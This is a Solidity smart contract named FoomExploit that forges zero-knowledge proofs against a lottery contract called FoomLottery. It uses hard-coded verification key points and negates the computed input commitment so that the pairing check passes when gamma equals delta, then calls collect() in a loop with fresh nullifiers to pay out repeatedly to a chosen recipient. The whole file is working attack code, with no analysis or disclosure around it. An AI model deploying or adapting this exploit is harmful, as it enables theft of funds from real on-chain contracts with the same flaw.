// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFoomLottery {
    function collect(
        uint256[2] calldata _pA,
        uint256[2][2] calldata _pB,
        uint256[2] calldata _pC,
        uint256 _root,
        uint256 _nullifierHash,
        address _recipient,
        address _relayer,
        uint256 _fee,
        uint256 _refund,
        uint256 _denomination,
        uint256 _anonSet
    ) external;

    function lastRoot() external view returns (bytes32);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract FoomExploit {
    uint256 constant P = 21888242871839275222246405745257275088696311157297823662689037894645226208583;

    uint256 constant ALPHA_X = 16428432848801857252194528405604668803277877773566238944394625302971855135431;
    uint256 constant ALPHA_Y = 16846502678714586896801519656441059708016666274385668027902869494772365009666;

    uint256 constant BETA_X1 = 3182164110458002340215786955198810119980427837186618912744689678939861918171;
    uint256 constant BETA_X2 = 16348171800823588416173124589066524623406261996681292662100840445103873053252;
    uint256 constant BETA_Y1 = 4920802715848186258981584729175884379674325733638798907835771393452862684714;
    uint256 constant BETA_Y2 = 19687132236965066906216944365591810874384658708175106803089633851114028275753;

    uint256 constant IC0_X = 18034728625187359240665687008203446290525175909013610993380285560790626416205;
    uint256 constant IC0_Y = 4838911559208885749525813755160034705362283044332640132147474767273110276364;

    uint256 constant IC1_X = 20645225571373678250368938393184144061643217843784195126034630470613271045128;
    uint256 constant IC1_Y = 6288099123069650552200194646860554847870547844848526797688131113668253881456;

    uint256 constant IC2_X = 4852905862447562718278474935403876771227407113171832528653029050154354910538;
    uint256 constant IC2_Y = 10065332012865665165743435938337559973984855860539738446902174508538633784913;

    uint256 constant IC3_X = 16534893255917854017020795101427343900183846939280659911923075937160731921404;
    uint256 constant IC3_Y = 19951628886467480903880394947569247180415085617787513331070867180467687700363;

    uint256 constant IC4_X = 18732305876480415018530597970140394989870247575757726629755216678954111960954;
    uint256 constant IC4_Y = 9232068287814360066272749902975933578271857215778307427653520408208786597393;

    function attack(address lottery, uint256 iterations, address recipient) external {
        uint256 root = uint256(IFoomLottery(lottery).lastRoot());
        uint256 startNullifier = uint256(keccak256(abi.encode(block.number, recipient))) % (2 ** 64);

        for (uint256 i = 0; i < iterations; i++) {
            _forgeAndCollect(lottery, root, startNullifier + i, recipient);
        }
    }

    function _forgeAndCollect(address lottery, uint256 root, uint256 nullifier, address recipient) internal {
        // Compute vk_x = IC[0] + root*IC[1] + nullifier*IC[2] + 7*IC[3] + recipient*IC[4]
        (uint256 vkxX, uint256 vkxY) = _computeVkX(root, nullifier, uint256(uint160(recipient)));

        // C = -vk_x  =>  pairing trivially holds when gamma == delta
        IFoomLottery(lottery).collect(
            [ALPHA_X, ALPHA_Y],
            [[BETA_X1, BETA_X2], [BETA_Y1, BETA_Y2]],
            [vkxX, P - vkxY],
            root,
            nullifier,
            recipient,
            address(0),
            0,
            0,
            7,
            0
        );
    }

    function _computeVkX(uint256 root, uint256 nullifier, uint256 recipientUint)
        internal
        view
        returns (uint256 rx, uint256 ry)
    {
        // vk_x = IC[0] + root*IC[1]
        (rx, ry) = _ecMul(IC1_X, IC1_Y, root);
        (rx, ry) = _ecAdd(rx, ry, IC0_X, IC0_Y);

        // + nullifier * IC[2]
        (uint256 tx, uint256 ty) = _ecMul(IC2_X, IC2_Y, nullifier);
        (rx, ry) = _ecAdd(tx, ty, rx, ry);

        // + 7 * IC[3]  (denomination)
        (tx, ty) = _ecMul(IC3_X, IC3_Y, 7);
        (rx, ry) = _ecAdd(tx, ty, rx, ry);

        // + recipient * IC[4]
        (tx, ty) = _ecMul(IC4_X, IC4_Y, recipientUint);
        (rx, ry) = _ecAdd(tx, ty, rx, ry);
        // IC[5..7] * 0 = identity, no contribution
    }

    function _ecMul(uint256 px, uint256 py, uint256 s) internal view returns (uint256, uint256) {
        uint256[3] memory input = [px, py, s];
        uint256[2] memory result;
        assembly {
            if iszero(staticcall(gas(), 7, input, 0x60, result, 0x40)) { revert(0, 0) }
        }
        return (result[0], result[1]);
    }

    function _ecAdd(uint256 p1x, uint256 p1y, uint256 p2x, uint256 p2y) internal view returns (uint256, uint256) {
        uint256[4] memory input = [p1x, p1y, p2x, p2y];
        uint256[2] memory result;
        assembly {
            if iszero(staticcall(gas(), 6, input, 0x80, result, 0x40)) { revert(0, 0) }
        }
        return (result[0], result[1]);
    }
}
